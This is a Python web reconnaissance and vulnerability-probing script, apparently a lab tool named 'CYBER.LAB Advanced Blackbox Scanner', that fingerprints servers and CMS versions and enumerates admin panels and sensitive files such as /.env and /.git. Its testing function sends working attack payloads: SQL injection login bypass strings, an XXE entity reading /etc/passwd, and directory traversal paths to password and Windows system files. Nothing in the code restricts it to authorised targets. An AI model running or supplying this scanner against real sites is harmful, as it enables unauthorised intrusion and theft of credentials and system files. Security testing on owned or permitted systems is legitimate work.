#!/usr/bin/env python3
"""
CYBER.LAB - Advanced Blackbox Scanner
Extended detection with version analysis, web server identification, and RE parameters
"""

import requests
import re
import json
import sys
import hashlib
from urllib.parse import urljoin, urlparse
from datetime import datetime
import warnings

warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class AdvancedBlackboxRecon:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 10
        self.findings = {
            'timestamp': datetime.now().isoformat(),
            'target': target_url,
            'reconnaissance': {},
            'server_details': {},
            'cms_details': {},
            'vulnerabilities': [],
            'endpoints': [],
            'technologies': [],
            're_parameters': {}  # Reverse Engineering parameters
        }
        
    def headers_user_agent(self):
        """Realistic user agents"""
        return {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }

    def advanced_fingerprint(self):
        """Comprehensive platform detection"""
        print("[*] Running advanced fingerprinting...")
        
        try:
            resp = self.session.get(self.target, headers=self.headers_user_agent())
            
            # Extract detailed server info
            server = resp.headers.get('Server', 'Unknown')
            x_powered_by = resp.headers.get('X-Powered-By', '')
            x_generator = resp.headers.get('X-Generator', '')
            
            self.findings['server_details'] = {
                'server_header': server,
                'x_powered_by': x_powered_by,
                'x_generator': x_generator,
                'response_code': resp.status_code,
                'content_length': len(resp.text),
                'connection_time': resp.elapsed.total_seconds()
            }
            
            print(f"[+] Server: {server}")
            print(f"[+] X-Powered-By: {x_powered_by}")
            print(f"[+] X-Generator: {x_generator}")
            
            # Detect web server type
            web_servers = {
                'Apache': r'Apache|Apache/\d+\.\d+',
                'Nginx': r'nginx|Nginx',
                'IIS': r'Microsoft-IIS|IIS',
                'Lighttpd': r'Lighttpd'
            }
            
            for ws_name, pattern in web_servers.items():
                if re.search(pattern, server, re.IGNORECASE):
                    self.findings['reconnaissance']['web_server'] = ws_name
                    self.findings['server_details']['identified_server'] = ws_name
                    print(f"[+] Web Server Detected: {ws_name}")
            
            # CMS Detection with version hints
            cms_patterns = {
                'Drupal': {
                    'patterns': [
                        r'Drupal\s+([\d\.]+)',
                        r'sites/default/files',
                        r'sites/all/modules',
                        r'/misc/drupal.js',
                        r'X-Powered-By.*Drupal\s+([\d\.]+)',
                    ],
                    'version_indicators': ['/CHANGELOG.txt', '/CHANGELOG.md', '/core/lib/Drupal.php']
                },
                'WordPress': {
                    'patterns': [
                        r'wp-content',
                        r'wp-admin',
                        r'wp-includes',
                        r'/wp-json/',
                        r'X-WordPress-Version\s*:\s*([\d\.]+)',
                    ],
                    'version_indicators': ['/wp-includes/version.php', '/wp-json/wp/v2/']
                },
                'Joomla': {
                    'patterns': [
                        r'Joomla',
                        r'/components/',
                        r'/modules/',
                        r'administrator'
                    ],
                    'version_indicators': ['/administrator/']
                }
            }
            
            for cms, info in cms_patterns.items():
                for pattern in info['patterns']:
                    match = re.search(pattern, resp.text + str(resp.headers), re.IGNORECASE)
                    if match:
                        self.findings['reconnaissance']['cms'] = cms
                        if match.groups():
                            self.findings['cms_details']['version'] = match.group(1)
                            print(f"[+] Detected: {cms} v{match.group(1)}")
                        else:
                            print(f"[+] Detected: {cms}")
                        return cms
            
        except Exception as e:
            print(f"[-] Error in advanced fingerprinting: {e}")
        
        return None

    def detect_framework_version(self):
        """Enhanced version detection"""
        print("[*] Detecting framework version...")
        
        version_sources = [
            '/CHANGELOG.txt',
            '/CHANGELOG.md',
            '/VERSION',
            '/.well-known/security.txt',
            '/composer.lock',
            '/package.json',
            '/INSTALL.md'
        ]
        
        for source in version_sources:
            try:
                resp = self.session.get(urljoin(self.target, source), 
                                       headers=self.headers_user_agent(), 
                                       timeout=5)
                if resp.status_code == 200:
                    # Extract version info
                    version_match = re.search(r'version\s*[=:]\s*([0-9\.]+)', 
                                             resp.text, re.IGNORECASE)
                    if version_match:
                        version = version_match.group(1)
                        self.findings['cms_details']['version'] = version
                        self.findings['reconnaissance']['version'] = version
                        print(f"[+] Version from {source}: {version}")
                        return version
            except:
                pass
        
        return None

    def extract_re_parameters(self):
        """Extract Reverse Engineering parameters for binary/code analysis"""
        print("[*] Extracting RE parameters...")
        
        try:
            resp = self.session.get(self.target, headers=self.headers_user_agent())
            
            # Calculate content hash for signature analysis
            content_hash = {
                'md5': hashlib.md5(resp.text.encode()).hexdigest(),
                'sha1': hashlib.sha1(resp.text.encode()).hexdigest(),
                'sha256': hashlib.sha256(resp.text.encode()).hexdigest()
            }
            
            self.findings['re_parameters']['content_hashes'] = content_hash
            
            # Extract JavaScript functions for analysis
            js_functions = re.findall(r'function\s+(\w+)\s*\(', resp.text)
            if js_functions:
                self.findings['re_parameters']['javascript_functions'] = list(set(js_functions))
                print(f"[+] Found {len(set(js_functions))} unique JS functions")
            
            # Extract API endpoints for API analysis
            api_endpoints = re.findall(r'(/[a-z0-9/_-]+\.(?:json|xml|api))', resp.text, re.IGNORECASE)
            if api_endpoints:
                self.findings['re_parameters']['api_endpoints'] = list(set(api_endpoints))
                print(f"[+] Found {len(set(api_endpoints))} API endpoints")
            
            # Extract comments and debug info
            comments = re.findall(r'(?://|#|<!--)(.*?)(?:\n|-->)', resp.text)
            if comments:
                debug_info = [c.strip() for c in comments if any(x in c.lower() for x in ['debug', 'todo', 'fixme', 'hack'])]
                if debug_info:
                    self.findings['re_parameters']['debug_comments'] = debug_info[:10]
                    print(f"[+] Found {len(debug_info)} debug comments")
            
            # Binary signatures in response
            suspicious_patterns = re.findall(r'\\x[0-9a-f]{2}', resp.text)
            if suspicious_patterns:
                self.findings['re_parameters']['binary_patterns'] = list(set(suspicious_patterns))
                print(f"[+] Found binary patterns: {len(set(suspicious_patterns))}")
            
        except Exception as e:
            print(f"[-] Error extracting RE parameters: {e}")

    def enumerate_all_endpoints(self):
        """Extended endpoint enumeration"""
        print("[*] Enumerating endpoints...")
        
        comprehensive_endpoints = [
            # Admin panels
            '/admin', '/administrator', '/admin.php', '/wp-admin', 
            '/administrator/index.php', '/dashboard',
            
            # API endpoints
            '/api', '/api/v1', '/api/v2', '/rest', '/rest/api',
            '/jsonapi', '/json', '/graphql', '/graphql/graphiql',
            '/wp-json', '/wp-json/wp/v2', '/wp-json/wp/v2/users',
            
            # Drupal specific
            '/node', '/user', '/user/login', '/user/register',
            '/admin/config', '/admin/modules', '/admin/people',
            '/admin/appearance', '/admin/structure',
            
            # WordPress specific  
            '/wp-login.php', '/wp-register.php', '/wp-content',
            '/wp-includes', '/wp-admin/admin-ajax.php',
            
            # Common paths
            '/.env', '/.env.local', '/config.php', '/settings.php',
            '/web.config', '/.htaccess', '/composer.json',
            '/README.md', '/LICENSE', '/INSTALL.md',
            
            # Version files
            '/VERSION', '/version.txt', '/CHANGELOG', '/CHANGELOG.txt',
            '/CHANGELOG.md', '/.git', '/.svn', '/.hg'
        ]
        
        for endpoint in comprehensive_endpoints:
            try:
                resp = self.session.get(urljoin(self.target, endpoint), 
                                       timeout=3, verify=False)
                result = {
                    'endpoint': endpoint,
                    'status': resp.status_code,
                    'size': len(resp.text),
                    'content_type': resp.headers.get('Content-Type', '')
                }
                
                if resp.status_code != 404:
                    self.findings['endpoints'].append(result)
                    print(f"[+] {endpoint}: {resp.status_code}")
                    
            except:
                pass

    def test_all_vulnerabilities(self):
        """Comprehensive vulnerability testing"""
        print("[*] Testing vulnerabilities...")
        
        tests = [
            {
                'name': 'SQL Injection (Login)',
                'path': '/user/login',
                'method': 'POST',
                'payload': {"name": "' OR '1'='1", "pass": "test"},
                'check': 'logout|dashboard|admin'
            },
            {
                'name': 'SQL Injection (REST)',
                'path': '/jsonapi/user/user',
                'method': 'GET',
                'payload': {"filter": "' OR '1'='1"},
                'check': 'data|user|id'
            },
            {
                'name': 'XXE Injection',
                'path': '/user/login',
                'method': 'POST',
                'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                'check': 'root:|nobody:|daemon:'
            },
            {
                'name': 'Directory Traversal',
                'paths': ['/../../../etc/passwd', '/../../config.php', '/..\\..\\..\\windows\\win.ini'],
                'check': 'root:|nobody:|daemon:|windows|system32'
            }
        ]
        
        for test in tests:
            try:
                if 'paths' in test:
                    for path in test['paths']:
                        resp = self.session.get(urljoin(self.target, path), timeout=3)
                        if re.search(test['check'], resp.text):
                            self.findings['vulnerabilities'].append({
                                'type': test['name'],
                                'path': path,
                                'severity': 'CRITICAL'
                            })
                else:
                    resp = self.session.request(test['method'], 
                                               urljoin(self.target, test['path']),
                                               data=test['payload'] if test['method'] == 'POST' else None,
                                               timeout=3)
                    if re.search(test['check'], resp.text):
                        self.findings['vulnerabilities'].append({
                            'type': test['name'],
                            'path': test['path'],
                            'severity': 'CRITICAL'
                        })
                        print(f"[+] Found: {test['name']}")
            except:
                pass

    def run_full_advanced_scan(self):
        """Execute complete advanced scan"""
        print("\n" + "="*70)
        print("CYBER.LAB - ADVANCED BLACKBOX SCAN")
        print("With RE Parameters & Version Analysis")
        print("="*70 + "\n")
        
        self.advanced_fingerprint()
        self.detect_framework_version()
        self.extract_re_parameters()
        self.enumerate_all_endpoints()
        self.test_all_vulnerabilities()
        
        print("\n" + "="*70)
        print(f"Scan completed at {datetime.now().isoformat()}")
        print("="*70 + "\n")

    def save_comprehensive_report(self, filename='advanced_blackbox_report.json'):
        """Save detailed report with RE parameters"""
        with open(filename, 'w') as f:
            json.dump(self.findings, f, indent=2)
        print(f"[+] Report saved to {filename}")
        
        return filename


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python3 advanced_scanner.py <target_url>")
        print("Example: python3 advanced_scanner.py http://localhost:8001")
        sys.exit(1)
    
    target = sys.argv[1]
    scanner = AdvancedBlackboxRecon(target)
    scanner.run_full_advanced_scan()
    scanner.save_comprehensive_report()
    
    print("\nFull findings:")
    print(json.dumps(scanner.findings, indent=2))
